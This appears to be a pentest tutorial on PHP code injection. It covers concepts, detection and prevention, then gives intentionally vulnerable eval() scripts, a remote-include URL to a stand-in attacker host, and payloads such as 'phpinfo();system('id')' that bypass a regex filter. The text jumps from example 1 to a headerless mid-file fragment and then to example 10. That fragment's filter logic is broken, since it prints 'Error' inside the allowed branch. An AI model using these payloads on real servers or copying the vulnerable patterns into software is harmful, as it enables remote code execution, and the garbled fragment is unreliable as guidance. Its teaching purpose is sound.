
# Code Injection 

Code Injection is a type of cyberattack where an attacker inserts malicious code into an application, and the application executes it.
This happens when the application does not properly check or validate user input.
Attackers can use this to change how the application works, steal data, or take control of systems.

---

## What is Code Injection?

Code Injection attacks happen when user input is not properly filtered or validated.
The attacker adds malicious code in the programming language of the application (e.g., PHP, SQL), and the application executes it.

* This allows unauthorized actions to happen.
* Unlike **Command Injection**, which uses system shell commands, **Code Injection** is limited only by what the application’s programming language can do.

---

## Examples of Code Injection

### Example 1: PHP `include()` function without validation

```text
http://testsite.com/index.php?page=contact.php
```

* An attacker can inject their own code:

```
http://testsite.com/?page=http://evilsite.com/evilcode.php
```

* This executes the attacker’s remote PHP script.

---

### Example 2: Using PHP `eval()` with unfiltered input

```php
$myvar = $_GET['arg'];
$x = $_GET['arg'];
eval("$myvar = $x;");
```

* An attacker could execute malicious code like:

```php
/index.php?arg=1; phpinfo()
```

---

## Types of Code Injection

* **SQL Injection:** Injecting malicious SQL queries to manipulate the database.
* **Command Injection:** Injecting system commands that the server executes.
* **Cross-Site Scripting (XSS):** Injecting malicious scripts into webpages that other users view.
* **LDAP Injection:** Manipulating LDAP queries for unauthorized access.
* **XML Injection:** Altering XML data or queries to change application behavior.

---

## How Code Injection Affects Organizations

* Data theft (credentials, payment information, sensitive data)
* Unauthorized system access and privilege escalation
* Service disruption or downtime
* Financial loss and reputational damage

---

## Detection Mechanisms

* **Static Analysis:** Scan source code for unsafe coding practices before deployment.
* **Dynamic Analysis:** Test running applications using simulated attacks.
* **Runtime Protection:** Monitor and block suspicious execution in real-time.
* **Input Validation:** Check all user input against expected formats.

---

## Prevention Best Practices

* **Input Sanitization:** Filter and clean input to remove dangerous characters.
* **Parameterized Queries:** Prevent SQL Injection by separating code from data.
* **Output Encoding:** Encode user output to stop XSS execution.
* **Content Security Policy (CSP):** Restrict unauthorized scripts in the browser.
* **Secure Coding Principles:** Avoid using unsafe functions like `eval()`.
* **Web Application Firewalls (WAFs):** Add an extra layer of protection.

# Code Injection PHP Examples

## 1. PHP Script (GET Method)
```
code-injection-1.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Code Injection</title>
</head>
<body>
    <pre>
        <?php
            $fun = $_REQUEST['fun'];       // Get user input from GET, POST, or COOKIE
            echo $fun . "<br>";            // Print raw input (unsafe)
            eval($fun . ";");              // Execute input as PHP code (vulnerable!)
        ?>
    </pre>
</body>
</html>
```

### Example URLs to test:

```
http://10.30.30.145/webpentest/code-injection.php?fun=phpinfo()
http://10.30.30.145/webpentest/code-injection.php?fun=sleep(10)
```

### Vulnerability Description

1. **User Input** → Taken directly from request without validation.
2. **Echo** → Displays input directly to the page.
3. **Eval** → Executes the input as PHP code → Arbitrary Code Execution.

**Risks:** Full server compromise, file access, data theft.

```php
  if (isset($_POST['fun'])) {
      $fun = $_POST['fun'];

      // Allow only functions starting with "phpinfo" or "print_r"
      if (preg_match('/^phpinfo|^print_r/', $fun)) {
          // Execute the allowed function dynamically
          eval($fun . ";");

          // Block all other inputs
          echo "Error";
      }
  }
  ?>
  </pre>
</body>

```
- Bypass Becouse using staring **^phpinfo** and **^print_r**
 - phpinfo();system('id')
 - print_r($_POST);system('id')

## 10. Safe Version Not Bypass
```php
code-injection-10.php
```
```php
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Secure Code Execution</title>
</head>
<body>
  <form action="code-injection-10.php" method="POST">
    Function:
    <select name="fun">
      <option value="phpinfo">phpinfo()</option>
      <option value="show_post">Show POST Data</option>
    </select><br>
    <input type="submit" name="run" value="Run">
  </form>

  <pre>
  <?php
  if (isset($_POST['fun'])) {
      $fun = $_POST['fun'];
      switch ($fun) {
          case 'phpinfo':
              phpinfo();
              break;

          case 'show_post':
              print_r($_POST);
              break;

          default:
              echo "Invalid function selected.";
      }
  }
  ?>
  </pre>
</body>
</html>
```
- Why this code can’t be bypassed:
  - **Whitelist is used** → only 2 fixed functions (`phpinfo`, `show_post`) are allowed.
  - **Switch-case validation** → strictly checks the input against predefined options.
  - **Default fallback** → any other value shows `"Invalid function selected."`.
  - **No dynamic execution** → no `eval()`, `call_user_func()`, or system calls are used.

> 👉 In short: **Whitelist + strict switch + no dynamic execution = no bypass possible.**

##  Things to keep in mind

### 1. Admin Functionality

* Code Injection usually appears in **admin-level features**, not normal user inputs.

### 2. Black Box Pentest

* **No source code** provided.
* Tester works like an outsider, guessing via inputs & outputs.

### 3. White Box Pentest

* **Full source code + architecture** given.
* Deep vulnerability analysis possible.

### 4. Blacklist Filtering

* Blocks specific **dangerous functions/characters** (e.g., `system`, `exec`, `;`, `<script>`).
* Weak security → can be bypassed.
* Regex style: `preg_match()`

### 5. Whitelist Filtering

* Allows only **safe/defined inputs** (e.g., `[a-zA-Z0-9]`).
* Strong security → but inconvenient for clients.
* Regex style: `!preg_match()`

---

### 🔑 Blacklist vs Whitelist (Quick Table)

| Aspect        | Blacklist 🚫      | Whitelist ✅           |
| ------------- | ----------------- | --------------------- |
| Method        | Block some items  | Allow only safe items |
| Security      | Weak (bypassable) | Strong (strict)       |
| Developer use | More common       | Less common           |
| Regex style   | `preg_match()`    | `!preg_match()`       |
